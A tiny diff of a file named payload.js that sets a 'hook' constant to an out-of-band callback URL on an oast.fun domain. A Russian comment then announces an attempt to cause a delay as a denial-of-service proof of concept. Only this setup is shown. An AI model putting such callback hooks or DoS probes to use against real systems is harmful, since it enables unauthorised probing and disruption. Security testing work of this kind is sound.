@@ -1,5 +1,5 @@
 // payload.js
-const hook = "esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+const hook = "http://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
 
 // 1. Пытаемся вызвать задержку (DoS/Performance PoC)
 const start = Date.now();
